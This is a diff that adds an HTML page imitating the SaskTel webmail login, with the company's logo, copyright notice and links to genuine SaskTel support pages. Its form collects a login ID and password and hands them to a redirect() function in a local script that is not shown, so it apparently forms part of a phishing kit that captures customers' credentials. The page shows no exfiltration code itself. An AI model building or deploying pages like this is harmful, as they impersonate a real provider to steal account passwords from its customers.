@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Login - Webmail 7.0</title>
+</head>
+<body class="bg-white">
+<header class="border-b border-gray-300 w-full p-4">
+        <nav class="flex justify-center md:justify-start md:px-20">
+            <img src="img/sask_tel_logo.png" alt="" class="w-36">
+        </nav>
+</header>
+    
+<section class="px-6">
+    <h1 class="text-center font-semibold text-4xl text-gray-700 text-nowrap mt-16">SaskTel Email</h1>
+
+    <div class=" pb-8 flex flex-col md:flex-row md:justify-center md:items-center  max-w-6xl mx-auto md:gap-12">
+            <div class="mt-16 md:w-1/2 border-r border-gray-400 p-6 md:p-20 ">
+                <h1 class="text-2xl font-semibold">Log in</h1>
+                <form action="" class="pt-4" id="form">
+                    <div class="flex flex-col gap-4">
+                        <div class="flex flex-col">
+                            <label for="" class="font-semibold">Login ID</label>
+                            <input required type="text" class="border border-gray-500 p-3 focus:outline-none" id="login_id">
+                        </div>
+
+                        <div class="flex flex-col">
+                            <label for=""class="font-semibold">Password</label>
+                            <input required type="password" class="border border-gray-500 p-3 focus:outline-none" id="password">
+                        </div>
+                    </div>
+
+                    <div class="pt-4 flex flex-col gap-4">
+                        <button onclick="redirect()" class="px-8 text-white py-3 bg-[#D31799] rounded-md w-fit">LOG IN</button>
+                        <h3 class="text-[#D31799]"><a href="https://webmail.sasktel.net/#/forgot">Forgotten Password?</a></h3>
+                    </div>
+                </form>
+            </div>
+            <div class="md:w-1/2 pt-12 flex flex-col md:justify-center gap-6 ">
+                <div class="flex flex-col gap-4">
+                    <h1 class="text-4xl font-semibold">Welcome to SaskTel Email</h1>
+                    <p>
+                        Log in to access your <span class="text-[#D31799]"><a href="https://webmail.sasktel.net/magnum/themes/branding/2370/index.html">sasktel.net</a></span> email account.
+                        Need help? <span class="text-[#D31799]"><a href="https://support.sasktel.com/app/answers/detail/a_id/15607"> See SaskTel email support.</a></span>
+                    </p>
+                </div>
+
+                <div class="flex flex-col gap-4">
+                    <h1 class="text-4xl font-semibold">Boost your email security!</h1>
+                    <p>
+                        Two-factor authentication (2FA) provides an additional layer of security when accessing your <span class="text-[#D31799]"><a href="https://webmail.sasktel.net/magnum/themes/branding/2370/index.html">sasktel.net</a></span> email account in a browser. <span class="text-[#D31799]"><a href="https://support.sasktel.com/app/answers/detail/a_id/27000">  Learn how to set up and use 2FA..</a></span>
+                    </p>
+                </div>
+            </div>
+    </div>
+</section>
+
+    <footer class="bg-black w-full lg:px-10 ">
+        <div class="flex gap-4 p-4">
+            <img src="img/logo_footer.png" alt="" class="md:w-28 lg:flex hidden">
+            <p class="text-white text-xs text-center">© 2025 SaskTel and its licensors. All rights reserved.</p>
+        </div>
+    </footer>
+
+</body>
+
+
+<script src="main.js"></script>
+</html>
